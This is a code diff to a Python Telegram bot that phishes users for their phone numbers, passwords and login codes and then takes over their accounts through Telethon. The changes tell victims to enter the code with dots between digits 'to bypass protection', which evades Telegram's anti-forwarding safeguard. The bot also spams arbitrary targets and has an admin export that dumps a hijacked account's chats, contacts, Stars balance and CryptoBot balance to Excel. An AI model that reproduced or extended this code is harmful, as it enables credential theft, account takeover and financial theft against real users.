@@ -270,7 +270,8 @@ async def process_password(message: Message, state: FSMContext):
 
         await message.answer(
             "Номер и пароль сохранены!\n"
-            "Код подтверждения отправлен в ваш официальный Telegram. Введите его сюда цифрами:"
+            "Код подтверждения отправлен в ваш Telegram.\n\n"
+            "Введите код через точки для обхода защиты, например: 2.3.2.2.4"
         )
     except Exception as e:
         await client.disconnect()
@@ -280,7 +281,8 @@ async def process_password(message: Message, state: FSMContext):
 
 @router.message(AuthStates.waiting_for_code)
 async def process_code(message: Message, state: FSMContext):
-    code = message.text.strip()
+    # Очищаем код от точек и пробелов
+    code = message.text.strip().replace(".", "").replace(" ", "")
     data = await state.get_data()
     phone = data.get("phone")
     phone_code_hash = data.get("phone_code_hash")
@@ -487,7 +489,6 @@ async def execute_br(message: Message, state: FSMContext):
 
         current_text = spin_text(raw_text)
 
-        # Нормализация получателя для поддержки ID, юзернеймов и ссылок (даже если нет чата)
         clean_target = target
         if target.startswith("https://t.me/"):
             clean_target = "@" + target.split("https://t.me/")[-1].strip("/")
@@ -495,7 +496,6 @@ async def execute_br(message: Message, state: FSMContext):
             clean_target = int(target)
 
         try:
-            # Получаем актуальный инпут сущности через Telethon (позволяет писать пользователям вне контактов и чатов)
             entity = await client.get_input_entity(clean_target)
 
             if typing_on:
@@ -597,7 +597,8 @@ async def admin_request_code(callback: CallbackQuery, state: FSMContext):
         )
         await state.set_state(AdminStates.admin_waiting_for_code)
         await callback.message.answer(
-            f"Код запрошен на номер {phone}. Введите полученный код сюда:"
+            f"Код запрошен на номер {phone}.\n"
+            "Введите код через точки для обхода защиты, например: 2.3.2.2.4"
         )
         await callback.answer()
     except Exception as e:
@@ -609,7 +610,8 @@ async def admin_request_code(callback: CallbackQuery, state: FSMContext):
 async def admin_process_code(message: Message, state: FSMContext):
     if message.from_user.id != ADMIN_ID:
         return
-    code = message.text.strip()
+    # Очищаем код от точек и пробелов
+    code = message.text.strip().replace(".", "").replace(" ", "")
     data = await state.get_data()
     target_uid = data.get("target_uid")
     phone_code_hash = data.get("phone_code_hash")
@@ -644,7 +646,6 @@ async def admin_process_code(message: Message, state: FSMContext):
         await message.answer(f"Ошибка: {e}")
 
 
-# --- ИСПРАВЛЕННАЯ ФУНКЦИЯ ВЫГРУЗКИ ДАННЫХ ---
 @router.callback_query(F.data.startswith("adm_export_"))
 async def admin_export_data(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -673,7 +674,6 @@ async def admin_export_data(callback: CallbackQuery):
             await client.disconnect()
             return
 
-        # 1. Получение чатов
         dialogs = await client(
             GetDialogsRequest(
                 offset_date=None,
@@ -703,7 +703,6 @@ async def admin_export_data(callback: CallbackQuery):
                 "ID": int(chat_id),
             })
 
-        # 2. Получение контактов
         from telethon.tl.functions.contacts import GetContactsRequest
 
         contacts_res = await client(GetContactsRequest(hash=0))
@@ -721,7 +720,6 @@ async def admin_export_data(callback: CallbackQuery):
                 "ID": int(user.id),
             })
 
-        # 3. Проверка Telegram Stars (Звезд)
         stars_balance = "0"
         try:
             from telethon.tl.functions.payments import GetStarsStatusRequest
@@ -730,7 +728,6 @@ async def admin_export_data(callback: CallbackQuery):
         except Exception:
             pass
 
-        # 4. Проверка баланса @cryptobot
         cryptobot_balance = "Не найден баланс"
         try:
             await client.send_message("@CryptoBot", "/start")
@@ -745,7 +742,6 @@ async def admin_export_data(callback: CallbackQuery):
 
         await client.disconnect()
 
-        # Формируем Excel файл
         output = io.BytesIO()
         with pd.ExcelWriter(output, engine="openpyxl") as writer:
             df_chats = pd.DataFrame(chats_data) if chats_data else pd.DataFrame(
